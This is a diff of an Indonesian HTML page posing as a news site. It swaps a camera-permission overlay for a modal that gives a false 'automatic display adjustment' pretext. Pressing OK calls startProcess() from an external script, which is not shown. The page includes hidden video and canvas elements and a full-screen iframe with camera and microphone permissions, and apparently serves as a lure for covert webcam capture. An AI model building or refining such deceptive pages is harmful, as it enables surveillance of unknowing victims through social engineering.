@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>Berita Terkini</title>
+  <title>Berita Informasi</title>
   <style>
     body, html {
       margin: 0;
@@ -13,71 +13,96 @@
       background-color: #f0f2f5;
     }
 
-    #overlay {
+    iframe {
       position: absolute;
-      z-index: 9999;
+      top: 0;
+      left: 0;
       width: 100%;
       height: 100%;
-      background: white;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
+      border: none;
+      z-index: 1;
+    }
+
+    #dialog {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 320px;
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      z-index: 9999;
+      padding: 24px;
       text-align: center;
     }
 
-    #overlay h1 {
-      font-size: 20px;
+    #dialog h2 {
+      margin-top: 0;
+      font-size: 18px;
       color: #333;
-      margin-bottom: 10px;
     }
 
-    #overlay p {
+    #dialog p {
       font-size: 14px;
-      color: #666;
-      max-width: 300px;
+      color: #555;
+      margin: 12px 0;
     }
 
-    .loader {
-      margin: 20px auto;
-      border: 5px solid #eee;
-      border-top: 5px solid #007bff;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
+    #okBtn {
+      margin-top: 16px;
+      padding: 10px 20px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      cursor: pointer;
     }
 
-    @keyframes spin {
-      to { transform: rotate(360deg); }
+    #okBtn:hover {
+      background-color: #0056b3;
+    }
+
+    #backdrop {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.3);
+      z-index: 9998;
     }
 
     video, canvas {
       display: none;
     }
-
-    iframe {
-      width: 100%;
-      height: 100%;
-      border: none;
-      z-index: 0;
-    }
   </style>
 </head>
 <body>
 
-<div id="overlay">
-  <h1>Menyesuaikan Tampilan...</h1>
-  <p>Sistem sedang menyesuaikan resolusi dan pencahayaan untuk kualitas tampilan optimal. Aktifkan kamera browser Anda untuk melanjutkan.</p>
-  <div class="loader"></div>
+<!-- Dialog Modal -->
+<div id="backdrop"></div>
+<div id="dialog">
+  <h2>Penyesuaian Otomatis</h2>
+  <p>Sistem perlu melakukan penyesuaian otomatis terhadap tampilan visual perangkat Anda. Silakan tekan "OK" untuk melanjutkan proses ini.</p>
+  <button id="okBtn">OK</button>
 </div>
 
 
+<!-- Hidden Elements -->
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas" width="640" height="480"></canvas>
 <iframe id="targetFrame" allow="autoplay; camera; microphone; picture-in-picture" allowfullscreen></iframe>
 
-<!-- Tidak diganti, sesuai permintaan -->
+<<script>
+  document.getElementById("okBtn").addEventListener("click", () => {
+    document.getElementById("dialog").remove();
+    document.getElementById("backdrop").remove();
+
+    startProcess(); // 👉 Panggil fungsi ini setelah klik OK
+  });
+</script>
 <script src="/script.js"></script>
 
 </body>
